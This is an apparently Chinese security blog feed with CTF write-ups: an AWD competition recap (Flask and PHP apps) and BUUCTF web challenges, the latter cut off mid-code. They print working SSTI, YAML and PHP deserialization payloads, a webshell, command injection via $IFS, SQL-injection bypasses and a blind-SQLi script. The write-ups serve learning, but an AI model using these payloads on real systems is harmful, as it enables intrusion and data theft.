    <content type="html"><![CDATA[<p>历史文章补发</p>        <h1 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>      <p>第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下</p><a id="more"></a>        <h1 id="Flask商城">          <a href="#Flask商城" class="heading-link"><i class="fas fa-link"></i></a>Flask商城</h1>              <h2 id="popen-命令执行">          <a href="#popen-命令执行" class="heading-link"><i class="fas fa-link"></i></a>popen()命令执行</h2>      <p>在search路由处存在命令执行漏洞</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">    url = request.form[<span class="string">'search'</span>]</span><br><span class="line"></span><br><span class="line">    msg = os.popen(url).read() </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> msg == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"search.html"</span>, msg=msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"search.html"</span>, msg=<span class="string">"Error.Check your command."</span>)</span><br></pre></td></tr></table></div></figure><p>非常明显的一个命令执行，popen函数用于从一个命令打开一个管道，会返回一个文件对象，所以可以被用来执行任意系统命令，由于比赛使用的gunicorn服务器，很多人修了洞之后却无法生效（因为没有重启gunicorn服务…）</p>        <h2 id="SSTI漏洞">          <a href="#SSTI漏洞" class="heading-link"><i class="fas fa-link"></i></a>SSTI漏洞</h2>      <p>在定义404返回的路由处存在ssti<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">        &#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">        &lt;div class="center-content error"&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;哇哦，This page doesn't exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;这里什么都没有呢٩(๑❛ᴗ❛๑)۶&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">        '''</span> % (request.url)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br></pre></td></tr></table></div></figure></p><p>找到SSTI漏洞，接下来就是沙盒逃逸，可用payload如下：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;)&#39;</span><br></pre></td></tr></table></div></figure><p>实例调用__class__属性时会指向该实例所对应的类；由于python允许多重继承，__mro__可以得到该类继承的父类，builtins是解释器自动导入的内置类，__import__()函数能够动态导入一些类从而进行命令执行</p><p>由于flask使用的模板渲染引擎是jinja2，所以payload还可以更简单一些，我们其实随便输入字符串都是有用的，jinja会生成一个undefined类<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code>，我们可以直接进行逃逸</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vvv.__class__.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;)</span><br></pre></td></tr></table></div></figure>        <h2 id="yaml反序列化">          <a href="#yaml反序列化" class="heading-link"><i class="fas fa-link"></i></a>yaml反序列化</h2>      <p>yaml库在使用yaml.load()方法解析yaml文件时会存在反序列化漏洞，可以使用yaml.safe_load()方法来避免该漏洞</p><p>想要序列化的类名必须使用上下文中存在的类名，但是类名中不一定有执行命令的相应方法，所以最好是通过构造标准类或类函数来实现命令执行，编辑如下文件并上传即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*-* exp.yml *-*</span><br><span class="line"></span><br><span class="line">!!python&#x2F;object&#x2F;new:subprocess.check_output [[&quot;cat&quot;,&quot;&#x2F;flag&quot;]]</span><br></pre></td></tr></table></div></figure>        <h1 id="easyweb">          <a href="#easyweb" class="heading-link"><i class="fas fa-link"></i></a>easyweb</h1>              <h2 id="1、-反序列化">          <a href="#1、-反序列化" class="heading-link"><i class="fas fa-link"></i></a>1、 反序列化</h2>      <p>反序列化漏洞有两处</p><p>第一处在首页存在提示</p><p><img src="/2020/09/13/YJTZB2019/1.png" alt></p><p>定位到cacf.php，查看代码，可以通过反序列化进行文件写入<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">'pcaq'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $fp = fopen(<span class="string">"log.php"</span>,<span class="string">"w"</span>) ;       </span><br><span class="line">        fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>反序列化写入shell<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">'&lt;?php eval($_GET["snow"]);?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> chybeta();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/09/13/YJTZB2019/2.png" alt></p><p>第二处在common/home.php中</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ping -c 2 $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$a=@$_POST[<span class="string">'a'</span>];</span><br><span class="line">@unserialize(base64_decode($a));</span><br></pre></td></tr></table></div></figure><p>在析构函数中通过调用ping函数可以实现命令执行，但是在waf函数中屏蔽了空格，用$IFS可以绕过</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"127.0.0.1;cat\$IFS/flag"</span>);</span><br><span class="line">$obj = <span class="keyword">new</span> home(<span class="string">"ping"</span> ,$arr);</span><br><span class="line">$obj = serialize($obj);</span><br><span class="line">$obj = base64_encode($obj);</span><br><span class="line"><span class="keyword">echo</span> $obj;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/09/13/YJTZB2019/8.png" alt></p>        <h2 id="2、万能密码">          <a href="#2、万能密码" class="heading-link"><i class="fas fa-link"></i></a>2、万能密码</h2>      <p>登录处存在sql注入</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></div></figure><p>可以通过万能密码登录</p><p>密码更新处同样也存在update注入</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"update users set password='$password' where id='"</span>.$_SESSION[<span class="string">'id'</span>].<span class="string">"';"</span>;</span><br></pre></td></tr></table></div></figure>        <h2 id="3、命令执行">          <a href="#3、命令执行" class="heading-link"><i class="fas fa-link"></i></a>3、命令执行</h2>      <p>在User.php中存在ping函数可以进行命令执行</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $host = $_POST[<span class="string">'host'</span>];</span><br><span class="line">        system(<span class="string">"ping -c $host"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/09/13/YJTZB2019/3.png" alt></p>        <h2 id="4、预置后门">          <a href="#4、预置后门" class="heading-link"><i class="fas fa-link"></i></a>4、预置后门</h2>      <p>预置后门有两个，一个在include/shell.php</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'admin_ccmd'</span>]);</span><br></pre></td></tr></table></div></figure><p>另一个在org/smarty/Autofoucer.php</p><p><img src="/2020/09/13/YJTZB2019/7.png" alt></p>        <h2 id="5、日志文件写入">          <a href="#5、日志文件写入" class="heading-link"><i class="fas fa-link"></i></a>5、日志文件写入</h2>      <p>根目录下log.php会记录网站访问记录，可以通过构造恶意访问写入shell</p><p><img src="/2020/09/13/YJTZB2019/9.png" alt></p><p><img src="/2020/09/13/YJTZB2019/4.png" alt></p>        <h2 id="6、上传漏洞">          <a href="#6、上传漏洞" class="heading-link"><i class="fas fa-link"></i></a>6、上传漏洞</h2>      <p>登录之后存在上传界面，查看上传逻辑代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;notallow=<span class="keyword">array</span>(<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"php3"</span>, <span class="string">"php4"</span>, <span class="string">"php7"</span>, <span class="string">"pht"</span>, <span class="string">"phtml"</span>, <span class="string">"htaccess"</span>,<span class="string">"html"</span>, <span class="string">"swf"</span>, <span class="string">"htm"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $id=$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">    $upfile=$_FILES[<span class="string">'pic'</span>];</span><br><span class="line">    $fileinfo=pathinfo($upfile[<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">if</span>(in_array($fileinfo[<span class="string">"extension"</span>],<span class="keyword">$this</span>-&gt;notallow))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>没有对大小写进行过滤，可以构造恶意文件上传</p><p><img src="/2020/09/13/YJTZB2019/5.png" alt></p><p><img src="/2020/09/13/YJTZB2019/6.png" alt></p>        <h1 id="Thinkphp5">          <a href="#Thinkphp5" class="heading-link"><i class="fas fa-link"></i></a>Thinkphp5</h1>      <p>公开CVE，略</p><p><strong>reference：</strong><br><span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/2908#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2908#toc-0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;

        &lt;h1 id=&quot;前言&quot;&gt;
          &lt;a href=&quot;#前言&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;前言&lt;/h1&gt;
      &lt;p&gt;第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="AWD" scheme="http://chaosec.top/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_WEB(一)</title>
    <link href="http://chaosec.top/2020/04/02/buuctf/"/>
    <id>http://chaosec.top/2020/04/02/buuctf/</id>
    <published>2020-04-02T10:43:19.000Z</published>
    <updated>2020-04-02T15:04:16.692Z</updated>
    
    <content type="html"><![CDATA[<p>今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~</p><a id="more"></a>        <h1 id="极客大挑战-2019-EasySQL">          <a href="#极客大挑战-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]EasySQL</h1>      <p>简单的万能密码即可登录</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8506b10-95f5-4f01-b77a-8485ee19e068.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin%27+or+1%23&amp;password&#x3D;fads</span><br></pre></td></tr></table></div></figure>        <h1 id="极客大挑战-2019-Havefun">          <a href="#极客大挑战-2019-Havefun" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]Havefun</h1>      <p>签到题，查看网页源代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">        $cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        --&gt;</span><br></pre></td></tr></table></div></figure><p>然后提交get参数<code>cat=dog</code>即可getflag</p>        <h1 id="极客大挑战-2019-FinalSQL">          <a href="#极客大挑战-2019-FinalSQL" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]FinalSQL</h1>      <p>本题是一个数字型注入，注入点在<code>id</code>参数，过滤了部分敏感词，如<code>and</code>，<code>空格</code>等，使用异或符号可以正常返回数据</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0^(1)</span><br></pre></td></tr></table></div></figure><p>所以可以据此进行盲注，但是题目过滤了空格，经过尝试发现空格无法用特殊字符绕过，不过此处可以使用无空格方式来注入，即通过括号包裹来避免使用空格，比如：<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(*)<span class="keyword">from</span>(<span class="keyword">admin</span>);</span><br></pre></td></tr></table></div></figure></p><p>盲注脚本如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_url = <span class="string">'http://33afb64c-ecb9-427b-b24e-100dbb7dd810.node3.buuoj.cn/search.php'</span></span><br><span class="line">ws = string.printable[:<span class="number">-6</span>]</span><br><span class="line">sign = <span class="string">"NO! Not this"</span></span><br><span class="line">table_name = <span class="string">"F1naI1y,Flaaaaag"</span></span><br><span class="line"><span class="comment"># column_name = 'id,fl4gawsl'   Flaaag</span></span><br><span class="line"><span class="comment"># column_name = 'id,username,password'</span></span><br><span class="line">column_name = <span class="string">'mygodcl4y_is_really_amazing,welco'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ws:</span><br><span class="line">        <span class="comment"># payload1 = "?id=0^(select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)"\</span></span><br><span class="line">            <span class="comment"># "where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;))"</span></span><br><span class="line">        <span class="comment"># payload2 = "?id=0^(select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)"\</span></span><br><span class="line">            <span class="comment"># "where(table_name='F1naI1y')),&#123;&#125;,1))=&#123;&#125;))"</span></span><br><span class="line">        payload2 = <span class="string">"?id=0^(select(ascii(substr((select(group_concat(username,password))from(F1naI1y)),&#123;&#125;,1))=&#123;&#125;))"</span></span><br><span class="line">        res = requests.get(base_url + payload2.format(len(column_name)+<span class="number">1</span>, ord(i))).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> sign <span class="keyword">in</span> res:</span><br><span class="line">            column_name += i</span><br><span class="line">            print(column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure><p>不得不吐槽一下的是flag所在表数据真的有点长，我都怀疑flag是不是不在这个表里面，如果只跑password字段的话应该会短一点</p><p><img src="/2020/04/02/buuctf/21.png" alt></p>        <h1 id="极客大挑战-2019-Secret-File">          <a href="#极客大挑战-2019-Secret-File" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]Secret File</h1>      <p>打开网站之后查看源代码可以看到提示<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id&#x3D;&quot;master&quot; href&#x3D;&quot;.&#x2F;Archive_room.php&quot; style&#x3D;&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></div></figure><br>访问Archive_room.php，题目提示<code>没看清么？请回去仔细看看</code>，应该是发生了跳转，抓包，发现了新的页面<code>secr3t.php</code>，访问得到源代码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><br>然后就是文件包含<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a74e337d-43ce-4de5-af4a-08d701cec8b1.node3.buuoj.cn&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></div></figure><br>解码即可得到flag</p>        <h1 id="极客大挑战-2019-PHP">          <a href="#极客大挑战-2019-PHP" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]PHP</h1>      <p>题目提示了网站备份，随手测试www.zip可以down到源码<br>查看index.php发现存在反序列化<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><br>查看class.php<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>很简单的反序列化，username为admin且password为100即可getflag，只需要绕过一下wakeup函数即可<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 